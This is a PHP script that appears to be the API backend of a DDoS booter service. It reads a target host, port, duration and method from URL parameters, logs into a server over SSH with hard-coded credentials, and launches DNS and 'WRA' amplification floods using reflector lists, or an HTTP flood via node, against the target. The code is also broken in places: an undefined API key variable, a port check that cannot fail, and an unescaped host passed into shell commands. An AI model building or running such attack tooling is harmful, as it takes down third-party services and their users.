<?php
    include('Net/SSH2.php');

    $address = "localhost"; // server ip

    $serverPort = 22; // your port (default = 22)
    
    $user = "suspect"; // root username

    $password = "suspect123"; // root password
    
    $methods = array("DNS", "WRA", "HTTP", "stop"); // methods

    $key = "yourkey"; // api key

    $host = $_GET["host"];
    $port = intval($_GET['port']);
    $time = intval($_GET['time']);
    $method = $_GET["method"];

    $key = $_GET["key"];

    if (empty($host) | empty($port) | empty($time) | empty($method)) // basic field checking
    {
        die("Make sure to verify your fields");
    }

    if (!is_numeric($port) || !is_numeric($time)) 
    {
        die('Time and port must be identified as a number');
    }
  
    if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL)) //target validating
    {
        die('Must use a correct IP(v4) or url');
    }

    if($port < 1 && $port > 65535) //port validating
    {
        die("Port is invalid");
    }

    if ($time < 1) //time validating
    {
        die("The time is invalid");
    }

    if (!in_array($method, $methods)) //method validating
    {
        die("This method i invalid");
    }
    
    if ($key !== $APIKey) //checking api key
    { 
        die("Your api key is invalid");
    }

    $connection = ssh2_connect($address, $serverPort);
    if(ssh2_auth_password($connection, $user, $password))
    {
        if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./DNS $host $port dns.list 2 300000 $time")){echo "Attack was sent to $host for $time seconds using $method!";}else{die("Error found");}}
        if($method == "WRA"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./WRA $host $port wra.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Error found");}}
        if($method == "HTTP"){if(ssh2_exec($connection, "screen -dm timeout $time node http.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Error found");}}
        if($method == "stop"){if(ssh2_exec($connection, "pkill -f $host")){echo "Attack stopped on $host!";}else{die("Error found");}}      
    }
    else
    {
        die("Unable to login to the remote server, make sure you are using your correct credentials.");
    }
?>